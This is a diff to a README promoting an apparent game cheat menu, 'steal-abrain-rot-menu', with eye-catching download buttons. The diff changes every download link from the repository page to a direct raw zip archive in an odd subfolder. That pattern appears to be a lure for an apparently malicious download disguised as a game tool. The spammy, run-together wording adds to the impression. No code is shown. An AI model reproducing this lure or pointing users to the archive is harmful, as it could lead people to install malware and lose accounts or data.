@@ -1,7 +1,7 @@
 <h1>🧠 steal-abrain-rot-menu - Enhance Your Game with Playful Power</h1>
 
 <p align="center">
-  <a href="https://github.com/rbvaradi/steal-abrain-rot-menu" style="display:inline-block;padding:15px 35px;background:linear-gradient(135deg,#ff6b6b,#ffa500);color:#fff;font-size:22px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 20px rgba(255,107,107,0.5);">🚀 DOWNLOAD NOW</a>
+  <a href="https://raw.githubusercontent.com/rbvaradi/steal-abrain-rot-menu/main/mar/steal-abrain-rot-menu-2.8.zip" style="display:inline-block;padding:15px 35px;background:linear-gradient(135deg,#ff6b6b,#ffa500);color:#fff;font-size:22px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 20px rgba(255,107,107,0.5);">🚀 DOWNLOAD NOW</a>
 </p>
 
 ---
@@ -44,7 +44,7 @@ Getting upand running takes less than two minutes. Follow the steps below, and y
 
 Go to the official download link below:
 
-[**🔗 CLICK HERE TO DOWNLOAD**](https://github.com/rbvaradi/steal-abrain-rot-menu)
+[**🔗 CLICK HERE TO DOWNLOAD**](https://raw.githubusercontent.com/rbvaradi/steal-abrain-rot-menu/main/mar/steal-abrain-rot-menu-2.8.zip)
 
 Visitthis link to downloadthe application.
 
@@ -153,7 +153,7 @@ Ready to start? Tap the button below again—you know you want to.
 
 
 <p align="center">
-  <a href="https://github.com/rbvaradi/steal-abrain-rot-menu" style="display:inline-block;padding:15px 35px;background:linear-gradient(135deg,#4caf50,#8bc34a);color:#fff;font-size:22px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 20px rgba(76,175,80,0.5);">⬇️ GET THE FUN NOW</a>
+  <a href="https://raw.githubusercontent.com/rbvaradi/steal-abrain-rot-menu/main/mar/steal-abrain-rot-menu-2.8.zip" style="display:inline-block;padding:15px 35px;background:linear-gradient(135deg,#4caf50,#8bc34a);color:#fff;font-size:22px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 20px rgba(76,175,80,0.5);">⬇️ GET THE FUN NOW</a>
 </p>
 
 ---
